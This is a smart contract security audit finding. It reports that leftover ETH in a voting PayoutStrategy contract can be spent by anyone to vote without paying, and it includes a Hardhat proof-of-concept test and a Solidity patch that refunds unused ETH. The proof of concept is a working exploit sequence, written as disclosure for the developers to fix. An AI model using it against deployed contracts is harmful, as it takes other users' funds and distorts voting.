# Use ETH inside payoutStrategy contract to vote without paying

## Summary
If someone uses fewer votes than the amount of ETH paid, the funds remains inside the PayoutStrategy contract and anyone can use this ETH to vote without paying.

## Vulnerability Detail
Imagine a person who uses fewer votes than the amount of ETH paid. For example, because he makes a couple of votes at the same time and has a mathematical error.

In this case, the ETH will remain inside the PayoutStrategy contract and anyone can use it to vote.

This happens because the vote function doesn't check if the user sends any msg.value, but just emits the Event for the vote cast and sends the ETH to the _grantAddress.

Taking advantage of this, anyone who sees that the PayoutStrategy contract has ETH can send encodedVotes for the value of ETH that the contract has and use it to vote.

**Proof of concept:**
```typescript
await round.connect(player).vote([ethers.utils.defaultAbiCoder.encode(
    ["address", "uint256", "address", "bytes32"],
    [
        ethers.constants.AddressZero,
        // Amount of votes
        900_000,
        player.address,
        ethers.utils.hexZeroPad(projectID.toHexString(), 32),
    ]
)],
// Amount of ETH sent
{ value: 1_000_000 }
);

// There are 100_000 in ETH inside the votingStrategy contract
expect(await ethers.provider.getBalance(votingStrategy.address)).to.equal(100_000);

// Someone else uses this ETH to vote
const vote2Tx = await round.connect(anotherPerson).vote([ethers.utils.defaultAbiCoder.encode(
    ["address", "uint256", "address", "bytes32"],
    [
        ethers.constants.AddressZero,
        // Amount of votes
        100_000,
        anotherPerson.address,
        ethers.utils.hexZeroPad(projectID.toHexString(), 32),
    ]
)]
// No ETH sent
);

await expect(vote2Tx).to.emit(
    votingStrategy, 'Voted'
).withArgs(
    ethers.constants.AddressZero,
    100_000,
    anotherPerson.address,
    anotherPerson.address,
    projectID,
    round.address
);

// Now the contract has 0 ETH
expect(await ethers.provider.getBalance(votingStrategy.address)).to.equal(0);
```

## Impact
By one person's mistake, anyone could be able to vote without paying.

## Tool used

Manual Review, Hardhat

## Recommendation
Send back to the user the ETH not used to vote.
```solidity
function vote(bytes[] calldata encodedVotes, address voterAddress) external override payable nonReentrant isRoundContract {
+  uint256 ethUsed = 0;

   for (uint256 i = 0; i < encodedVotes.length; i++) {

        (
            address _token,
            uint256 _amount,
            address _grantAddress,
            bytes32 _projectId
        ) = abi.decode(encodedVotes[i], (
            address,
            uint256,
            address,
            bytes32
        ));

        if (_token == address(0)) {
+           ethUsed = ethUsed + _amount;
            AddressUpgradeable.sendValue(payable(_grantAddress), _amount);
        } else {
            SafeERC20Upgradeable.safeTransferFrom(
            IERC20Upgradeable(_token),
            voterAddress,
            _grantAddress,
            _amount
            );
  
        }

        emit Voted(
            _token,
            _amount,
            voterAddress,
            _grantAddress,
            _projectId,
            msg.sender
        );

    }

+   uint ethDiff = msg.value - ethUsed;
+   if (ethDiff > 0) {
+       AddressUpgradeable.sendValue(payable(voterAddress), ethDiff);
+   }
    
}

```
